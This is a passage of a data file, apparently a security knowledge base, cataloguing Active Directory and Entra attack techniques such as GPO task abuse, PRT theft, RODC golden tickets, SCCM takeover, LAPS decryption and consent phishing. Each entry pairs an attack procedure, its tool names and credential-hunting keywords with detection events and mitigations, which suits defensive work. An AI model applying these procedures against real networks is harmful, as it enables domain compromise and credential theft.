defaultSecurityDescriptor changes on schema NC objects (5136) and Schema Admins member changes as top-priority events. Periodically audit for suspicious ACEs common across newly created objects.","events":"5136 (schema defaultSecurityDescriptor変更), 4756/4728 (Schema Admins追加), 4662","mitigate":"Keep Schema Admins empty and operate with temporary additions only when changes are needed. Alert on schema NC changes, periodically baseline-compare defaultSecurityDescriptor, and manage strictly as Tier0."},{"name":"GPO Immediate Scheduled Task / Restricted Groups Abuse","aka":"GPO immediate task deployment, Restricted Groups forced local-admin addition, SharpGPOAbuse","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1484.001","cve":"","sev":"High","summary":"A concrete vector abusing edit rights on an existing GPO to deploy an immediate scheduled task or force a local admin addition via Restricted Groups, achieving code execution and persistence on downstream endpoints.","how":"With write access to a GPO, use SharpGPOAbuse to add an Immediate Scheduled Task to the GPP, running SYSTEM/user commands on all endpoints under the linked OU. Or use Restricted Groups/GPP Local Users and Groups to force the attacker account into each endpoint's local Administrators for lateral movement and persistence.","tools":"SharpGPOAbuse, pyGPOAbuse, PowerView (GPO ACL), GPOwned","detect":"Detect changes to GPOs (especially SYSVOL ScheduledTasks.xml/Groups.xml) (5136/5145 SYSVOL write) and gptmpl/GPP additions. On clients, monitor gpsvc-triggered immediate task execution and local Administrators additions (4732 local).","events":"5136 (versionNumber/gPCFileSysPath), 5145 (SYSVOL書込), 4732 (ローカルAdmin追加), Sysmon 1","mitigate":"Minimize GPO edit/link rights and alert on GPO changes. Perform SYSVOL integrity monitoring, baseline Restricted Groups, and inventory write ACLs on critical GPOs."},{"name":"Pass-the-Certificate (PKINIT / Schannel)","aka":"TGT acquisition via PKINIT, PFX authentication, LDAPS certificate authentication","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1550","cve":"","sev":"High","summary":"A lateral-movement technique using a PFX/certificate obtained by theft or via Shadow Credentials/ADCS to acquire a TGT via PKINIT and authenticate to LDAPS via Schannel (an independent technique focused on authentication use).","how":"Using a user/computer certificate (PFX) obtained via THEFT/ESC/Shadow Credentials, acquire a PKINIT TGT with Rubeus asktgt /certificate or Certipy auth. Combined with UnPAC or U2U, also recover the NT hash; or, even when PKINIT is disabled, authenticate to LDAPS (certificate mapping) via Schannel to chain into RBCD granting or DCSync.","tools":"Rubeus (asktgt /certificate), Certipy (auth), PassTheCert, gettgtpkinit.py","detect":"Detect TGT issuance via PKINIT (4768 with certificate info), unexpected certificate-based LDAPS authentication, and Schannel client-certificate mapping. Monitor certificate authentication across many accounts in a short period and use of certificates from non-standard templates.","events":"4768 (PKINIT TGT, Certificate Information), 4887/4886 (ADCS発行), Schannelログ (36880系)","mitigate":"Enforce strong certificate mapping for certificate-based authentication (KB5014754 strong mapping) and remediate vulnerable templates/ESC. Revoke stolen certificates, audit KeyCredential on sensitive accounts, and protect ADCS."},{"name":"Primary Refresh Token (PRT) Theft & Abuse","aka":"PRT theft, PRT-cookie, hybrid SSO abuse","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1528","cve":"","sev":"High","summary":"A hybrid attack surface where PRT/PRT-cookie/session key are stolen from an Entra (Azure AD) hybrid-joined device to access Entra resources via cloud SSO with MFA bypass.","how":"After gaining SYSTEM/admin on a joined device, extract the PRT and its session key (derived from a Nonce) from LSASS (CloudAP) or DPAPI, then forge an x-ms-RefreshTokenCredential (PRT-cookie). Inject it into a browser to establish Entra SSO and reach cloud apps (M365, Azure), usually without an MFA re-prompt. Abusing the device key and transport key also enables persistent token issuance.","tools":"ROADtoken, AADInternals, Mimikatz (sekurlsa/cloudap), requestaadrefreshtoken, TokenTactics","detect":"In Entra ID sign-in logs, detect PRT-based SSO from anomalous device/location, non-interactive token issuance, and known-tool User-Agents. On the endpoint, use EDR to monitor LSASS (CloudAP) access and signs of PRT-cookie generation.","events":"Entra Sign-in logs (PRT/deviceトークン), 4624 + LSASSアクセス (Sysmon 10), Identity Protectionリスク検知","mitigate":"Apply Conditional Access (device compliance / phishing-resistant MFA / token protection) and enable TPM-based device keys and Credential Guard on endpoints. Block PRT abuse with risk-based sign-in and minimize local admin rights on devices."},{"name":"Rubeus tgtdeleg (Usable TGT Extraction)","aka":"tgtdeleg, GSS-API delegation ticket extraction","phase":"credaccess","group":"Kerberos","mitre":"T1550.003","cve":"","sev":"Medium","summary":"A technique that extracts a usable TGT for the current user (with session key) from the current logon session by abusing the GSS-API delegation mechanism, without plaintext or hashes.","how":"Rubeus tgtdeleg uses SSPI InitializeSecurityContext to request delegation without KERB_AP_OPTIONS_CBT, then pulls the current user's usable TGT and session key from the KRB-CRED (delegation ticket) inside the AP-REQ. No admin rights or hashes are needed, and it works even without unconstrained delegation, extracting from the current logon to serve as a starting point for Pass-the-Ticket and subsequent S4U/delegation attacks.","tools":"Rubeus (tgtdeleg), 相当のSSPI委任コード","detect":"tgtdeleg alone looks like legitimate Kerberos on the wire and is hard to detect, so detect the post-extraction Pass-the-Ticket (same TGT used on a different host, IP-mismatched 4769). Combine with EDR detection of the Rubeus process/command line.","events":"4769 (TGS要求, PtT兆候), 4768, EDRプロセス検知 (Rubeus)","mitigate":"Place sensitive accounts in Protected Users (TGT non-delegable, AES enforced) and deploy Kerberos armoring (FAST). Eliminate unconstrained delegation, shorten TGT lifetime, and operate Pass-the-Ticket detection (ticket-reuse correlation)."},{"name":"RODC Password Replication Policy Abuse (Credential Reveal)","aka":"PRP abuse / msDS-RevealOnDemand / RODC cache theft","phase":"credaccess","group":"Host / Local","mitre":"T1003","cve":"","sev":"High","summary":"Abuses an RODC's Password Replication Policy (msDS-RevealOnDemand/NeverRevealGroup) and local admin delegation to extract credentials of accounts within the RODC's cacheable scope. Branch/DMZ-deployed RODCs are a common entry point.","how":"An attacker who gains RODC local admin (administrator role delegation) extracts the cached secrets the RODC holds. Accounts on the PRP allow list (msDS-RevealOnDemand) are replicated and cached to the RODC on demand, so add a target to the allow list, force its authentication, and harvest the hash from NTDS/LSA on the RODC. Misconfiguration of the Allowed RODC Password Replication Group that makes high-privilege accounts cacheable is catastrophic.","tools":"Get-ADDomainControllerPasswordReplicationPolicy, repadmin /prp, mimikatz/secretsdump(RODC上), PowerView, BloodHound","detect":"Monitor changes to RODC PRP attributes (msDS-RevealOnDemand/msDS-NeverRevealGroup), Allowed RODC Password Replication Group membership changes, and credential replication of unexpected accounts to the RODC. Detect anomalous RODC local-admin operations with EDR.","events":"4728/4732(グループ変更), 5136(PRP属性変更), 4662","mitigate":"Minimize the PRP allow list and never cache privileged/Tier0 accounts on RODCs (Denied RODC Password Replication Group / msDS-NeverRevealGroup). Harden RODC local-admin delegation and physical protection. Exclude RODCs from the authentication path of sensitive accounts."},{"name":"RODC krbtgt Golden Ticket (Scoped)","aka":"RODC-specific krbtgt (krbtgt_NNNNN) abuse / scope-limited Golden","phase":"dominance","group":"Dominance & Persistence","mitre":"T1558.001","cve":"","sev":"High","summary":"Obtains the key of an RODC-specific krbtgt account (krbtgt_NNNNN) and forges a Golden Ticket-equivalent TGT scoped to what that RODC services (PRP-allowed accounts).","how":"Compromise an RODC and obtain the hash of the RODC-specific krbtgt (krbtgt_<numeric>, referenced by msDS-KrbTgtLink). A TGT forged with this RODC-krbtgt is a scoped Golden Ticket valid only against accounts/resources that PRP permits replicating to that RODC. The scope is limited but usable for persistence in a branch environment. Note it is a separate key from the writable DC's krbtgt.","tools":"mimikatz (kerberos::golden with RODC krbtgt), Rubeus, secretsdump(RODC)","detect":"Monitor for anomalous TGTs issued by the RODC-krbtgt, unexpected high-privilege access under that RODC, and anomalous access to the RODC krbtgt. As with normal krbtgt, detect lifetime/RC4 anomalies.","events":"4769, 4768, 4624","mitigate":"On RODC compromise, reset the RODC-krbtgt (krbtgt_NNNNN). Minimize the PRP scope and do not cache high privileges on the RODC. Physically/logically protect the RODC and enforce Tier0 separation."},{"name":"SCCM Site Takeover (Site Server / Site DB)","aka":"Misconfiguration Manager TAKEOVER / SCCM Full Administrator hijack","phase":"lateral","group":"Management Infra Abuse (SCCM/WSUS/MSSQL)","mitre":"T1557, T1187, T1078.002","cve":"","sev":"Critical","summary":"Exploits excessive permissions on the SCCM/MECM site server or site database to seize the site hierarchy, reaching domain-wide control via SYSTEM execution on all collection endpoints and credential harvesting.","how":"Gain SCCM Full Administrator via Misconfiguration Manager TAKEOVER techniques (e.g., NTLM-relaying the site server machine account to the site DB/SMS Provider, or privilege escalation on a management point). Then distribute SYSTEM commands to any collection via CMPivot or app/script deployment and harvest NAA and management-point credentials. In a hierarchy (CAS), taking over an upper site cascades to all lower sites.","tools":"SharpSCCM, sccmhunter, Misconfiguration Manager (TAKEOVER-*), ntlmrelayx (MSSQL/HTTP), PXEthief","detect":"Monitor for anomalous logins to the site DB (MSSQL), NTLM-relay traces of the site server machine account, changes granting the SMS Admin role (Full Administrator), and anomalous CMPivot/mass deployments. Correlate SCCM audit logs with MSSQL auditing.","events":"4624/4648(MSSQL/サイト), 4672, SCCM/MSSQL監査ログ","mitigate":"Protect site server/DB NTLM with EPA and signing, and isolate the site DB on a dedicated host. Minimize SMS Provider and SQL permissions, eliminate NAA at management points (move to Enhanced HTTP/PKI), and strictly manage and audit the Full Administrator role."},{"name":"SCCM PXE Boot Media Credential Extraction","aka":"PXE OSD credential theft / PXEthief / NAA harvesting","phase":"lateral","group":"Management Infra Abuse (SCCM/WSUS/MSSQL)","mitre":"T1552, T1078.002","cve":"","sev":"High","summary":"In environments where SCCM PXE boot (OSD) is enabled, breaks the PXE media policy encryption to extract task sequence variables and credentials such as the Network Access Account (NAA).","how":"Request a boot from a PXE-enabled distribution point (DP) and obtain the encrypted media (variables.dat/policy). If the PXE password is unset/weak, decrypt it and harvest credentials, NAA, and the domain-join account from the task sequence. Automated with tools like PXEthief.","tools":"PXEthief, sccmhunter, SharpSCCM, powerpxe","detect":"Monitor for anomalous DHCP/PXE requests, suspicious boot requests to DPs, and anomalous use of NAA credentials. Review PXE media access logs.","events":"4624/4648(NAA使用), DHCP/WDSログ","mitigate":"Set a strong PXE password and, where possible, disable PXE/OSD. Eliminate the NAA and move to Enhanced HTTP/PKI, and do not embed credentials in task sequences. Network-isolate DPs."},{"name":"Share / SYSVOL Credential Mining (Snaffler)","aka":"Full-text file share scanning / Snaffler / PowerHuntShares","phase":"recon","group":"Credential Discovery","mitre":"T1552.001, T1083","cve":"","sev":"High","summary":"Full-text scans reachable file shares and SYSVOL to harvest plaintext/near-plaintext credentials found in scripts, config files, connection strings, KeePass/ini, etc.","how":"Enumerate shares as an authenticated user and scan with Snaffler/manspider targeting extensions and keywords (password, connectionString, .kdbx, unattend.xml, web.config, *.ps1). Rapidly extract credentials and sensitive files embedded in SYSVOL logon scripts and non-GPP configurations.","tools":"Snaffler, PowerHuntShares, manspider, findstr/grep","detect":"Detect broad file access to many shares by a single account (high volume of 5145), recursive enumeration of SYSVOL/shares, and Snaffler-specific access patterns. Use honeyfiles/canary tokens for early detection.","events":"5145(共有オブジェクトアクセス), 5140, 4663","mitigate":"Inventory shares and apply least privilege (fix over-permissioning), remove plaintext credentials from config files, and strip secrets from SYSVOL scripts. Deploy DLP/file auditing and honeyfiles."},{"name":"Windows LAPS Read / Decrypt (msLAPS-EncryptedPassword)","aka":"Current Windows LAPS (2023+) abuse / DPAPI-NG decryption","phase":"credaccess","group":"Host / Local","mitre":"T1552, T1078.002","cve":"","sev":"High","summary":"Reads msLAPS-Password / msLAPS-EncryptedPassword managed by current Windows LAPS (2023+) and, for the encrypted version, decrypts it with DPAPI-NG to obtain the local admin password. A separate attribute and defensive surface from the legacy ms-Mcs-AdmPwd (plaintext).","how":"With a principal holding Read on the target computer object's LAPS attributes, read msLAPS-Password directly if plaintext. If encrypted (msLAPS-EncryptedPassword), decrypt with DPAPI-NG in the context of the SID specified as the encryption target (by default Domain Admins, etc.) or that group. Also target reading from password history (msLAPS-EncryptedPasswordHistory) and DSRM backups.","tools":"LAPSToolkit, Get-LapsADPassword, NetExec (laps), PowerView, bloodyAD","detect":"Detect LDAP reads (4662) of LAPS attributes (msLAPS-Password/msLAPS-EncryptedPassword), decryption by unexpected principals, and audit ExtendedRights holders. Assess ReadLAPSPassword reachability with BloodHound.","events":"4662(LAPS属性アクセス), 4624","mitigate":"Restrict Read on LAPS attributes to a minimal set of admins and inventory regularly. Enable encryption (DPAPI-NG) and narrow the principals able to decrypt, operate password history and automatic rotation, and protect DSRM/backup paths."},{"name":"Entra Device Code Phishing","aka":"Device Code Flow abuse / microsoft.com/device phishing","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1566, T1528","cve":"","sev":"High","summary":"Abuses Entra ID (Azure AD) OAuth 2.0 Device Authorization Grant, tricking a victim into entering a code at the legitimate microsoft.com/devicelogin to steal access/refresh tokens.","how":"The attacker starts the Device Code Flow to obtain a user_code and presents the legitimate Microsoft sign-in URL (microsoft.com/devicelogin) and code to the victim. When the victim approves with their own credentials + MFA, the attacker polls to obtain access/refresh tokens and thereafter accesses M365/Azure with them. Because the destination is a legitimate MS domain, it is convincing.","tools":"TokenTactics, AADInternals, roadtx, o365-attack-toolkit","detect":"In Entra sign-in logs, monitor for anomalous device code authentications (protocol=deviceCode), token issuance from unexpected devices/locations, and approval of the same user_code within a short window. Leverage Identity Protection risk detections.","events":"Entra Sign-in logs(Device Code), Identity Protection リスク","mitigate":"Restrict device code flow with Conditional Access (only required users/locations), and apply phishing-resistant MFA (FIDO2) and token protection. User education and risk-based sign-in blocking."},{"name":"Entra OAuth Consent Phishing (Illicit Grant)","aka":"Consent phishing / Illicit Consent Grant","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1550.001, T1528","cve":"","sev":"High","summary":"Tricks a victim into approving consent (OAuth consent) to a malicious Entra app registration, obtaining delegated permissions to Graph API etc. (Mail.Read/Files.ReadWrite, etc.) for persistent data access without password/MFA.","how":"The attacker registers a multi-tenant app and lures the victim to the legitimate Microsoft consent screen. When the victim consents, a refresh token is issued in that user's scope, allowing the app to access Mail/Files thereafter. It works in tenants where user consent is allowed and is not revoked by password change or MFA (consent revocation is required).","tools":"365-Stealer, GraphRunner, o365-attack-toolkit","detect":"In Entra audit logs, monitor for new service principals / OAuth consent grants (Consent to application), grants of high-risk delegated permissions, and consent to unverified apps. Correlate anomalous Graph access.","events":"Entra Audit(Consent to application / Add app role assignment), Defender for Cloud Apps アラート","mitigate":"Restrict user consent to an admin-approval workflow (admin consent required) and block apps from unverified publishers. Periodically inventory existing consents/OAuth grants and revoke suspicious apps. Deploy app governance (Defender for Cloud Apps)."}];
